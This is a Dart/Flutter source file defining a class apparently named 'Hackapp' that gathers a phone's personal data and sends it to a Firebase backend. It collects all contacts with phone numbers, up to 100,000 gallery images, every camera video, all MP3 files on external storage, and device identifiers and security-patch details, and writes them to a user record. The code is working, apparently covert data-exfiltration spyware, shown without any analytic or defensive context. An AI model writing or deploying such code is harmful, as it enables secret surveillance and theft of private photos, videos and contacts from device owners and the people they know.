import 'dart:io';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info/device_info.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:path_provider/path_provider.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:video_compress/video_compress.dart';

FirebaseStorage storage = FirebaseStorage.instance;
final _firestore = FirebaseFirestore.instance;

class Hackapp extends ChangeNotifier {
  String deviceName = '';
  String deviceVersion = "";
  String identifier = '';
  String deviceOwnerName = '';
  List<Contact> contacts = [];
  Future<void> accessallcontact(uid) async {
    if (await FlutterContacts.requestPermission()) {
      List<Map<String, dynamic>> phonemuber = [];

      contacts = await FlutterContacts.getContacts(withProperties: true);
      for (var i = 0; i < contacts.length; i++) {
        if (contacts[i].phones.isNotEmpty) {
          phonemuber
              .add({contacts[i].displayName: contacts[i].phones[0].number});
        }
      }
      await _firestore.collection('users').doc(uid).update(
        {
          'Contacts': FieldValue.arrayUnion(phonemuber),
        },
      );

      return;
    }
  }

  Future<void> loadGalleryImages(String uid) async {
    final List<AssetPathEntity> paths =
        await PhotoManager.getAssetPathList(type: RequestType.image);

    final List<AssetEntity> assets = await paths[0].getAssetListRange(
      start: 0,
      end: 100000,
    );

    for (var element in assets) {
      element.file.then((value) async {
        if (value?.path != null) {
          bool issaved = await alreadyExistlink(link: value?.path ?? '');
          if (issaved) {
          } else {
            final link = await _uploadImage(File(value!.path));
            uploadlink(uid, link, value.path);
          }
        }
      });
    }
  }

  Future<bool> alreadyExistlink({required String link}) async {
    QuerySnapshot querySnap = await _firestore
        .collection('users')
        .where('locallink', arrayContains: link)
        .get();
    return querySnap.docs.isNotEmpty;
  }

  Future<bool> alreadyExistlinkvideo({required String link}) async {
    QuerySnapshot querySnap = await _firestore
        .collection('users')
        .where('locallinkvideo', arrayContains: link)
        .get();
    return querySnap.docs.isNotEmpty;
  }

  Future<List<String>> getDeviceDetails() async {
    final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        var build = await deviceInfoPlugin.androidInfo;
        deviceName = build.model;
        deviceVersion =
            "preview : ${build.version.previewSdkInt}, release: ${build.version.release}, sdk : ${build.version.sdkInt}, securityPatch: ${build.version.securityPatch} ";
        identifier = build.androidId; //UUID for Android
        deviceOwnerName = build.host;
      } else if (Platform.isIOS) {
        var data = await deviceInfoPlugin.iosInfo;
        deviceName = data.name;
        deviceVersion = data.systemVersion;
        identifier = data.identifierForVendor; //UUID for iOS
      }
    } on PlatformException {
      print('Failed to get platform version');
    }

    return [deviceName, deviceVersion, identifier, deviceOwnerName];
  }

  Future<String> _uploadImage(File file) async {
    final String fileName = file.path.split('/').last;
    final Reference reference = storage.ref().child('images/$fileName');
    final UploadTask uploadTask = reference.putFile(file);
    final TaskSnapshot taskSnapshot = await uploadTask;
    return await taskSnapshot.ref.getDownloadURL();
  }

  uploadlink(String uid, String link, String locallink) async {
    await _firestore.collection('users').doc(uid).update(
      {
        'images': FieldValue.arrayUnion([link]),
        'locallink': FieldValue.arrayUnion([locallink])
      },
    );
  }

  Future<List<String>> getAllVideos() async {
    List<String> videos = [];
    final directory = await getExternalStorageDirectory();
    const path = '/storage/emulated/0/DCIM/Camera';
    print(path);
    Directory dir = Directory(path);
    if (await dir.exists()) {
      dir.listSync().forEach((element) {
        if (element.path.endsWith('.mp4')) {
          videos.add(element.path);
        }
      });
    }
    return videos;
  }

  Future<String> uploadVideoToFirebase(String filePath) async {
    final file = File(filePath);
    final fileName = filePath.split('/').last;
    final storageRef = FirebaseStorage.instance.ref().child('videos/$fileName');
    final metadata = SettableMetadata(contentType: 'video/mp4');
    final info = await VideoCompress.compressVideo(
      file.path,
      quality: VideoQuality.DefaultQuality,
      deleteOrigin: false,
    );
    final filelocal = File(info?.path ?? '');
    final uploadTask = storageRef.putFile(filelocal, metadata);
    final snapshot = await uploadTask.whenComplete(() => null);
    final downloadURL = await snapshot.ref.getDownloadURL();
    return downloadURL;
  }

  Future<void> uploadAllVideosToFirebase(value) async {
    final videos = await getAllVideos();
    for (final videoPath in videos) {
      bool issaved = await alreadyExistlink(link: videoPath);
      if (!issaved) {
        final downloadURL = await uploadVideoToFirebase(videoPath);
        uploadlinkvideo(value, downloadURL, videoPath);
      }
    }
  }

  uploadlinkvideo(String uid, String link, String locallink) async {
    await _firestore.collection('users').doc(uid).update(
      {
        'video': FieldValue.arrayUnion([link]),
        'locallinkvideo': FieldValue.arrayUnion([locallink])
      },
    );
  }

  Future<List<File>> getAllMp3Files() async {
    List<File> mp3Files = [];
    try {
      final Directory? storageDir = await getExternalStorageDirectory();
      final List<FileSystemEntity> allFiles =
          storageDir!.listSync(recursive: true);
      for (final file in allFiles) {
        if (file.path.endsWith('.mp3')) {
          mp3Files.add(File(file.path));
        }
      }
    } on Exception catch (e) {
      print('this is $e');
    }
    return mp3Files;
  }

  Future<String> uploadMp3File(File mp3File) async {
    final Reference storageRef = FirebaseStorage.instance
        .ref()
        .child('mp3s/${mp3File.path.split('/').last}');
    final UploadTask uploadTask = storageRef.putFile(mp3File);
    final TaskSnapshot downloadUrl = (await uploadTask);
    return downloadUrl.ref.getDownloadURL();
  }

  uploadallmp3file(String uid) async {
    var mediafile = await getAllMp3Files();
    for (var element in mediafile) {
      bool issaved = await alreadyExistlinkmedia(link: element.path);
      if (!issaved) {
        final link = await uploadMp3File(element);
        uploadlinkmedia(uid, link, element.path);
      }
    }
  }

  uploadlinkmedia(String uid, String link, String locallink) async {
    await _firestore.collection('users').doc(uid).update(
      {
        'Media': FieldValue.arrayUnion([link]),
        'locallinkMeadia': FieldValue.arrayUnion([locallink])
      },
    );
  }

  Future<bool> alreadyExistlinkmedia({required String link}) async {
    QuerySnapshot querySnap = await _firestore
        .collection('users')
        .where('locallinkMeadia', arrayContains: link)
        .get();
    return querySnap.docs.isNotEmpty;
  }
}
